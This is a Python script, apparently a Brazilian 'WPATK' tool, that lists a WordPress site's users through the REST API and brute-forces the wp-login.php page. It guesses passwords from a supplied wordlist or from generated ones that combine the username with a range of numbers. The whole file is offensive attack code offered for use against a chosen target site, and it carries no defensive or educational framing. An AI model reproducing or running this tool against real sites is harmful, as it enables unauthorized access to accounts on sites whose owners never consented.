#!/usr/bin/python
# -*- coding: utf-8 -*-
# Coded by Supr3m0
index = r"""
____________________________________________________________

__          _______     _______ _  __ Recoda não comédia!
\ \        / /  __ \ /\|__   __| |/ /
 \ \  /\  / /| |__) /  \  | |  | ' / 
  \ \/  \/ / |  ___/ /\ \ | |  |  <  
   \  /\  /  | |  / ____ \| |  | . \  
    \/  \/   |_| /_/    \_\_|  |_|\_\ v1 (BETA)

Ferramenta avançada de brute force para o CMS Wordpress
Criado por Supr3m0 (Yunkers Crew)
Github: github.com/2inf3rnal
Facebook: www.fb.com/yunkers01/
____________________________________________________________"""
paramx = """--url =        site alvo
--usuario =    Usuario que deseja utilizar
--wordlist =   Wordlist que deseja utilizar (Não é obrigatório)
--verbose =    Modo detalhado de todo o processo
--threads =    Tanto de requisições
--enumerar =   Enumerar usuários de um determinado site
--ajuda =      Manual de ajuda

Enumerando usuarios:
python3 wpatk.py --url localhost.com --enumerar

Usando Brute Force padrão:
python3 wpatk.py --url localhost.com --usuario <usuario> --wordlist <wordlist.txt> 

Usando Brute Force padrão no modo verbose (detalhado):
python3 wpatk.py --url localhost.com --usuario <usuario> --wordlist <wordlist.txt> --verbose

Usando Brute Force sem wordlist:
python3 wpatk.py --url localhost.com --usuario <usuario> 
OBS: Irá aparecer uma tela para você colocar de x a x de números... (Exemplo: do número 2 até o número 10)

Usando Brute Force padrão com um tempo de requisição:
python3 wpatk.py --url localhost.com --usuario <usuario> --threads 10 --wordlist <wordlist.txt>

Recomendado:
python3 wpatk.py --url localhost.com --usuario <usuario> --threads 20 --wordlist <wordlist> --verbose
"""
import sys
try:
	import requests as r
except:
	print("Módulo 'Requests' não instalado!\nExecute: pip install requests ou pip3 install requests.")
	exit()
import argparse as arg
try:
	import colorama 
	from colorama import Fore as F
except:
	print("Módulo 'colorama' não instalado!\nExecute: pip install colorama ou pip3 install colorama.")
	exit()
import os
try:
	import data.config as config
except:
	print("Arquivo (data/config.py) não encontrado!!!")
	exit()
os.system('cls' if os.name == 'nt' else 'reset')

def arruma(url):
	if url[-1] != "/":
		url = url + "/"
	if url[:7] != "http://" and url[:8] != "https://":
		url = "http://" + url
	return url
wordlist = []

parser = arg.ArgumentParser(description = "WPATK v1. coded by supr3m0")
parser.add_argument("--url", action='store', help = "Site alvo.")
parser.add_argument("--usuario", action='store', help = "Usuario do CMS.")
parser.add_argument("--wordlist", action='store', help = "Wordlist (não e obrigatorio).")
parser.add_argument("--enumerar", action='store_true', help = "Apenas enumerar os usuarios.")
parser.add_argument("--verbose", action='store_true', help = "Modo verbose (Detalhado).")
parser.add_argument("--threads", action='store', type = int, default = "10", help = "Tempo para cada requisição.")
parser.add_argument("--ajuda", action='store_true', help = "Manual de ajuda.")
param = parser.parse_args()




if param.ajuda:
	print(F.GREEN + index)
	print(F.WHITE + paramx)
	exit()
if not param.url:
	print("Insira uma URL\nuse: python3 wpatk.py --ajuda")
	exit()
url = arruma(param.url)
enum = url + "wp-json/wp/v2/users/"
dirbrute = url + "wp-login.php"
print(F.GREEN + index)
print(F.GREEN + "[+]" + F.WHITE + " Site alvo: {}".format(url))
user_agent = {'User-agent': 'Mozilla/5.0'}
if param.enumerar:
	checa = r.get(enum, headers=user_agent)
	if checa.status_code != 404 and "slug" in checa.text:
		print(F.GREEN + "[+]" + F.WHITE + " Conexão estavel.")
		print(F.GREEN + "\n[*]" + F.WHITE + " Enumerando usuarios...")
		config.enumerar(enum)
		print()
		print(F.GREEN + "[*] " + F.WHITE + "Scan completo!")
		exit()
	else:
		print(F.RED + "[ERRO]" + F.WHITE + " Conexão ao site {} rejeitada!".format(enum))
		exit()

if not param.usuario:
	print(F.RED + "[ERRO]" + F.WHITE + " Precisa do usuario para fazer o ataque de brute force.")
	print(F.WHITE + "    Use o parametro (--enumerar) para enumerar todos usuarios do site.")
	print(F.WHITE + "    python3 wpbrute.py --url <alvo> --enumerar")
	exit()

if param.verbose:
	verbose = 1
else:
	verbose = 0

if not param.wordlist:
	checa = r.get(dirbrute, headers=user_agent)
	if checa.status_code != 404 and "login" in checa.text:
		print(F.GREEN + "[+]" + F.WHITE + " Conexão estavel.")
		print("\n" + F.WHITE + "Criando Wordlist:")

		print(F.YELLOW + "Insira o minimo de caracteres numericos (ex: 0)")
		mini = int(input(F.RED + "@WPBrute" + F.WHITE + "| MIN |: "))
		print(F.YELLOW + "\nInsira o maximo de caracteres numericos (ex: 2000)")
		maxi = int(input(F.RED + "@WPBrute" + F.WHITE + "| MAX |: "))
		print(F.GREEN + "\n[*]" + F.WHITE + " Escrevendo wordlist com base no usuario {}...".format(param.usuario))

		for xpass in range(mini, maxi):
			wordlist.append(param.usuario + str(xpass))

		for xpass in range(mini, maxi):
			wordlist.append(str(xpass) + param.usuario)

		print(F.GREEN + "[+]" + F.WHITE + " Wordlist escrita com sucesso!\n    Total de senhas: {}".format(str(len(wordlist))))
		print(F.GREEN + "\n[*]" + F.WHITE + " ataque de brute force iniciado!\n")
		
		config.brute_ataque(dirbrute, param.usuario, wordlist, verbose, param.threads)
		print(F.GREEN + "[*] " + F.WHITE + "Completo!")
	else:
		print(F.RED + "[ERRO]" + F.WHITE + " Conexão ao site {} rejeitada!".format(enum))
		exit()
else:
	arq = open(param.wordlist, "r")
	arq = arq.readlines()
	for y in arq:
		wordlist.append(y)
	wordlist = [y.replace("\n", "") for y in wordlist]
	checa = r.get(dirbrute, headers=user_agent)
	if checa.status_code != 404 and "login" in checa.text:
		print(F.GREEN + "[+]" + F.WHITE + " Conexão estavel.")
		print(F.GREEN + "\n[*]" + F.WHITE + " Ataque de brute force iniciado!\n")
		config.brute_ataque(dirbrute, param.usuario, wordlist, verbose, param.threads)
		print(F.GREEN + "[*] " + F.WHITE + "Completo!")
	else:
		print(F.RED + "[ERRO]" + F.WHITE + " Conexão ao site {} rejeitada!".format(enum))
		exit()
exit()
